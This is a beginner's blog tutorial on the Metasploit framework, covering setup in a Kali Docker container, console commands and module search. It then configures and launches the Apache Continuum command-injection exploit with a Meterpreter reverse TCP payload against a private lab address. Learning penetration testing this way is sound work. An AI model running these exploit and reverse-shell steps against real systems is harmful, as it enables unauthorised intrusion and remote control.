---
layout: post
title: Metasploit Quickstart Guide
---

This guide is created by a beginner for beginners to help you take your first steps to learning the 
[Metasploit](https://metasploit.com) framework.

At the end of this post, I am providing a list of great resources to be used as references when using Metasploit. I find those resources to be great references for someone who already knows what they are looking for. However, by focusing mostly on explaining the terminology and steps of penetration testing, they failed to provide a clear organized roadmap to help a beginner like myself understand the ins and outs of Metasploit, which encouraged me to write this guide.

In this step-by-step guide, we will skip terminology and penetration testing steps (as they are already very well covered in other resources) and we will jump directly into exploring the Metasploit framework from installation to exploitation.

# Installing Metasploit

The easiest way to start using Metasploit right away without needing to install Metasploit on your machine is to use 
the official [Kali Linux Docker container](https://store.docker.com/community/images/kalilinux/kali-linux-docker). 
You don't need to have experience with [Docker](https://www.docker.com/), 
but you will need to have it installed on your machine from the [Docker Store](https://store.docker.com/search?offering=community&type=edition). 
To start the Docker container and install Metasploit, use the following commands:
```
$ docker run -it kalilinux/kali-linux-docker bash
root@0129d62d2319:/# apt-get install -y metasploit
````
To avoid installing Metasploit every time you start the container, 
you may need to use a Kali Linux container with Metasploit installed like 
[this one](https://store.docker.com/community/images/linuxkonsult/kali-metasploit) <sup>*</sup>, in which case, 
you would use the following commands instead:
```
$ docker run -it linuxkonsult/kali-metasploit
root@0129d62d2319:/# msfupdate
```
> <sup>*</sup> Disclaimer: This is NOT an official Kali Linux image and was not tested by the author. 
Use at your own responsibility.

## Initial Setup

On your Docker container, run the following commands to start the PostreSQL database server used by the Metasploit framework, then start the console:
```
service postgresql start
msfdb init
msfconsole
```
# Exploring Metasploit

To get more familiar with the Metasploit framework, let's start by checking its commands. 
I am highlighting the [most commonly used commands](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/) 
and we will go over some of them as we move forward.
```
msf> help
```
```
Core Commands
=============
    Command       Description
    -------       -----------
    ?             Help menu
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    edit          Edit the current module with $VISUAL or $EDITOR
    exit          Exit the console
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    info          Displays information about one or more modules
    irb           Drop into irb scripting mode
    jobs          Displays and manages jobs
    kill          Kill a job
    load          Load a framework plugin
    loadpath      Searches for and loads modules from a path
    makerc        Save commands entered since start to a file
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    quit          Exit the console
    reload_all    Reloads all modules from all defined module paths
    rename_job    Rename a job
    resource      Run the commands stored in a file
    route         Route traffic through a session
    save          Saves the active datastores
    search        Searches module names and descriptions
    sess          Interact with a given session
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    show          Displays modules of a given type, or all modules
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    use           Selects a module by name
    version       Show the framework and console library version numbers
...
```
To learn more about one of the commands, e.g. `search`, we can simply do:
```
msf> help search
```
```
Usage: search [keywords]

Keywords:
  app       :  Modules that are client or server attacks
  author    :  Modules written by this author
  bid       :  Modules with a matching Bugtraq ID
  cve       :  Modules with a matching CVE ID
  edb       :  Modules with a matching Exploit-DB ID
  name      :  Modules with a matching descriptive name
  platform  :  Modules affecting this platform
  ref       :  Modules with a matching ref
  type      :  Modules of a specific type (exploit, auxiliary, or post)

Examples:
  search cve:2009 type:exploit app:client
```
As we can see the search command searches modules by name, type, platform, ...

Now let's say we would like to find an exploit to use against a web application running on a Linux machine:
```
msf> search type:exploit platform:linux app:web
```
```
Matching Modules
================
   Name                                                        Disclosure Date  Rank       Description
   ----                                                        ---------------  ----       -----------
   exploit/android/adb/adb_server_exec                         2016-01-01       excellent  Android ADB Debug Server Remote Payload Execution
   exploit/android/local/futex_requeue                         2014-05-03       excellent  Android 'Towelroot' Futex Requeue Kernel Exploit
   exploit/android/local/put_user_vroot                        2013-09-06       excellent  Android get_user/put_user Exploit
   exploit/firefox/local/exec_shellcode                        2014-03-10       normal     Firefox Exec Shellcode from Privileged Javascript Shell
   exploit/linux/antivirus/escan_password_exec                 2014-04-04       excellent  eScan Web Management Console Command Injection
   exploit/linux/ftp/proftp_sreplace                           2006-11-26       great      ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   exploit/linux/ftp/proftp_telnet_iac                         2010-11-01       great      ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   exploit/linux/games/ut2004_secure                           2004-06-18       good       Unreal Tournament 2004 "secure" Overflow (Linux)
   exploit/linux/http/airties_login_cgi_bof                    2015-03-31       normal     Airties login-cgi Buffer Overflow
   exploit/linux/http/apache_continuum_cmd_exec                2016-04-06       excellent  Apache Continuum Arbitrary Command Execution
   exploit/linux/http/belkin_login_bof                         2014-05-09       normal     Belkin Play N750 login.cgi Buffer Overflow
   exploit/linux/http/cisco_firepower_useradd                  2016-10-10       excellent  Cisco Firepower Management Console 6.0 Post Authentication UserAdd Vulnerability
   exploit/linux/http/dlink_authentication_cgi_bof             2013-02-08       normal     D-Link authentication.cgi Buffer Overflow
   exploit/linux/http/dlink_dcs931l_upload                     2015-02-23       great      D-Link DCS-931L File Upload
   exploit/linux/http/dlink_dir605l_captcha_bof                2012-10-08       manual     D-Link DIR-605L Captcha Handling Buffer Overflow
   exploit/linux/http/dlink_dspw110_cookie_noauth_exec         2015-06-12       normal     D-Link Cookie Command Execution
   exploit/linux/http/dlink_dspw215_info_cgi_bof               2014-05-22       normal     D-Link info.cgi POST Request Buffer Overflow
   exploit/linux/http/dlink_hedwig_cgi_bof                     2013-02-08       normal     D-Link hedwig.cgi Buffer Overflow in Cookie Header
   exploit/linux/http/dlink_hnap_bof                           2014-05-15       normal     D-Link HNAP Request Remote Buffer Overflow
   exploit/linux/http/dlink_hnap_header_exec_noauth            2015-02-13       normal     D-Link Devices HNAP SOAPAction-Header Command Execution
   exploit/linux/http/dlink_hnap_login_bof                     2016-11-07       excellent  Dlink DIR Routers Unauthenticated HNAP Login Stack Buffer Overflow
   exploit/linux/http/dlink_upnp_exec_noauth                   2013-07-05       normal     D-Link Devices UPnP SOAP Command Execution
   ...
```
Next, let's say that we decided to use one of the shown modules, e.g. `exploit/linux/http/apache_continuum_cmd_exec`
```
msf> use exploit/linux/http/apache_continuum_cmd_exec
```
By selecting a module, we have switched from the global context to the module context. To get more info about the selected module:
```
msf exploit(apache_continuum_cmd_exec) > info
```
```
       Name: Apache Continuum Arbitrary Command Execution
     Module: exploit/linux/http/apache_continuum_cmd_exec
   Platform: Linux
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2016-04-06

Provided by:
  David Shanahan
  wvu <wvu@metasploit.com>

Available targets:

  Id  Name
  --  ----
  0   Apache Continuum <= 1.4.2

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOST                     yes       The target address
  RPORT    8080             yes       The target port (TCP)
  SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
  SRVPORT  8080             yes       The local port to listen on.
  SSL      false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
  URIPATH                   no        The URI to use for this exploit (default is random)
  VHOST                     no        HTTP server virtual host

Payload information:

Description:
  This module exploits a command injection in Apache Continuum <= 
  1.4.2. By injecting a command into the installation.varValue POST 
  parameter to /continuum/saveInstallation.action, a shell can be 
  spawned.

References:
  https://www.exploit-db.com/exploits/39886
```
Alternatively, we may only care about the options of the module:
```
msf exploit(apache_continuum_cmd_exec) > options
```
```
Module options (exploit/linux/http/apache_continuum_cmd_exec):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    8080             yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host

Exploit target:
   Id  Name
   --  ----
   0   Apache Continuum <= 1.4.2
```
To know which payloads can be used with this exploit:
```
msf exploit(apache_continuum_cmd_exec) > show payloads
```
```
Compatible Payloads
===================
   Name                                      Disclosure Date  Rank    Description
   ----                                      ---------------  ----    -----------
   generic/custom                                             normal  Custom Payload
   generic/debug_trap                                         normal  Generic x86 Debug Trap
   generic/shell_bind_tcp                                     normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                                  normal  Generic Command Shell, Reverse TCP Inline
   generic/tight_loop                                         normal  Generic x86 Tight Loop
   linux/x64/exec                                             normal  Linux Execute Command
   linux/x64/mettle/bind_tcp                                  normal  Linux Mettle x64, Bind TCP Stager
   linux/x64/mettle/reverse_tcp                               normal  Linux Mettle x64, Reverse TCP Stager
   linux/x64/mettle_reverse_tcp                               normal  Linux Meterpreter
   linux/x64/shell/bind_tcp                                   normal  Linux Command Shell, Bind TCP Stager
   linux/x64/shell/reverse_tcp                                normal  Linux Command Shell, Reverse TCP Stager
   linux/x64/shell_bind_tcp                                   normal  Linux Command Shell, Bind TCP Inline
   linux/x64/shell_bind_tcp_random_port                       normal  Linux Command Shell, Bind TCP Random Port Inline
   linux/x64/shell_reverse_tcp                                normal  Linux Command Shell, Reverse TCP Inline
   linux/x86/chmod                                            normal  Linux Chmod
   linux/x86/exec                                             normal  Linux Execute Command
   linux/x86/meterpreter/bind_ipv6_tcp                        normal  Linux Meterpreter, Bind IPv6 TCP Stager (Linux x86)
   linux/x86/meterpreter/bind_ipv6_tcp_uuid                   normal  Linux Meterpreter, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   linux/x86/meterpreter/bind_nonx_tcp                        normal  Linux Meterpreter, Bind TCP Stager
   linux/x86/meterpreter/bind_tcp                             normal  Linux Meterpreter, Bind TCP Stager (Linux x86)
   linux/x86/meterpreter/bind_tcp_uuid                        normal  Linux Meterpreter, Bind TCP Stager with UUID Support (Linux x86)
   linux/x86/meterpreter/reverse_ipv6_tcp                     normal  Linux Meterpreter, Reverse TCP Stager (IPv6)
   linux/x86/meterpreter/reverse_nonx_tcp                     normal  Linux Meterpreter, Reverse TCP Stager
   linux/x86/meterpreter/reverse_tcp                          normal  Linux Meterpreter, Reverse TCP Stager
   ...
```
Now, we need to select one of the payloads for our attack:
```
msf exploit(apache_continuum_cmd_exec) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
PAYLOAD => linux/x86/meterpreter/reverse_tcp


msf exploit(apache_continuum_cmd_exec) > options 

Module options (exploit/linux/http/apache_continuum_cmd_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    8080             yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   DebugOptions  0                no        Debugging options for POSIX meterpreter
   LHOST                          yes       The listen address
   LPORT         4444             yes       The listen port

...
```
Now, we need to set the remote host (`RHOST`) and the local host (`LHOST`) addresses as they are required options:
```
msf exploit(apache_continuum_cmd_exec) > set RHOST 192.168.1.10

RHOST => 192.168.1.10


msf exploit(apache_continuum_cmd_exec) > set LHOST 192.168.1.15

LHOST => 192.168.1.15


msf exploit(apache_continuum_cmd_exec) > options

Module options (exploit/linux/http/apache_continuum_cmd_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST    192.168.1.10     yes       The target address
   RPORT    8080             yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   DebugOptions  0                no        Debugging options for POSIX meterpreter
   LHOST         192.168.1.15     yes       The listen address
   LPORT         4444             yes       The listen port
```
Next, we run the exploit:
```
msf exploit(apache_continuum_cmd_exec) > run
```
```
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Injecting CmdStager payload...
```
We now have a server running on our Kali box at `192.168.1.15` listening at port `4444` and trying to attack remote server 
at `192.168.1.10`

... To be continued

# Resources

### To learn more
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed)
- [Metasploit - The Penetration Tester's Guide](http://www.nostarch.com/metasploit) 
- [Metasploit External Resource Portal](http://resources.metasploit.com/)

### To seek help:
- [Rapid7 Community](https://community.rapid7.com/community/metasploit)
- [Information Security - Stack Exxchange](https://security.stackexchange.com/questions/tagged/metasploit)
